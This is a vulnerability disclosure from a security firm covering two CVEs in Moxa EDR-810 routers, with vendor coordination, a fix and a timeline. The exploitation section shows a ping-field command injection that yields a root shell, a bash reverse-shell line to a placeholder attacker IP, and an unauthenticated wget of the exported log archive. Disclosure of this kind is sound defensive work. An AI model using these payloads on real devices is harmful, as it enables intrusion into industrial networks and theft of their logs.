During an engagement for a client, RandoriSec found 2 vulnerabilities on Moxa EDR-810 Series Secure Routers. The first one is a command injection vulnerability found on the CLI allowing an authenticated user to obtain root privileges. And the other one is an improper access control found on the web server allowing to retrieve log files. 

As usual, we reported those issues directly to Moxa and ICS-CERT (Industrial Control Systems Cyber Emergency Response Team) in order to â€œresponsible discloseâ€ them. 

The ICS-CERT advisory was published on their website and a new EDR-810 firmware was provided by Moxa. 

Many thanks to Moxa and ICS-CERT teams for their help.



Advisory

The following two product vulnerabilities were identified in Moxaâ€™s EDR-810 Series Secure Routers, all versions 5.1 and prior are vulnerable:

CVE-2019-10969: An exploitable command injection vulnerability exists in the CLI functionality, which is provided by the Telnet and SSH services. An authenticated attacker (with admin or configadmin privileges) can abuse the ping feature to execute commands on the router. As the CLI is executed with root privileges, it is possible to obtain a root shell on the device. A CVSS v3 base score of 7.2 has been calculated.
CVE-2019-10963: An unauthenticated attacker can retrieve all the log files (Firewall, IPSec and System) from the webserver. In order to exploit the issue, a legitimate user had to export the log files previously. A CVSS v3 base score of 4.3 has been calculated.


Exploitation

CVE-2019-10969 - Ping Command Injection

The Telnet and SSH services provide a Command Line Interface (CLI), which is a restricted shell allowing to perform a subset of actions on the device. The ping function of the CLI is vulnerable to command injection. It is possible to specify a specific hostname, such as ($/bin/bash), in order to obtain a shell as shown below: 

Ping command injection

Due to limitations on the CLI, it is not possible to use the shell as is. The attacker can use a reverse shell as shown below:
bash -i >& /dev/tcp/YOUR_IP_ADDRESS/1234 0>&1


CVE-2019-10963 - Missing Access Control On Log Files

When a legitimate user (admin or configadmin for instance) export the logs files from the MOXA router. The files are stored at the root of the webserver, as follow:

http://IP_ADDRESS_MOXA/MOXA_All_LOG.tar.gz
An attacker can retrieve this archive without being authenticated on the Web interface as shown below:

# wget http://192.168.0.1/MOXA_All_LOG.tar.gz
--2019-02-13 17:35:19--  http://192.168.0.1/MOXA_All_LOG.tar.gz
Connexion Ã  192.168.0.1:80... connectÃ©.
requÃªte HTTP transmise, en attente de la rÃ©ponse... 200 OK
Taille : 15724 (15K) [text/plain]
Sauvegarde en : " MOXA_All_LOG.tar.gz "

MOXA_All_LOG.tar.gz                                       100%[====================================================================================================================================>]  15,36K  --.-KB/s    ds 0s      

2019-02-13 17:35:19 (152 MB/s) - " MOXA_All_LOG.tar.gz " sauvegardÃ© [15724/15724]

# tar ztvf MOXA_All_LOG.tar.gz 
drwxr-xr-x admin/root        0 2019-02-13 11:55 moxa_log_all/
-rw-r--r-- admin/root   326899 2019-02-13 11:55 moxa_log_all/MOXA_Firewall_LOG.ini
-rw-r--r-- admin/root      156 2019-02-13 11:55 moxa_log_all/MOXA_IPSec_LOG.ini
-rw-r--r-- admin/root    68465 2019-02-13 11:55 moxa_log_all/MOXA_LOG.ini


Mitigation

It is recommended to install at least the firmware version 5.3 from Moxa website.



Timeline

2019-02-24: Vendor Disclosure
2019-02-24: Advisory sent to ICS-CERT
2019-09-30: Advisory published by Moxa
2019-10-01: Advisory published by ICS-CERT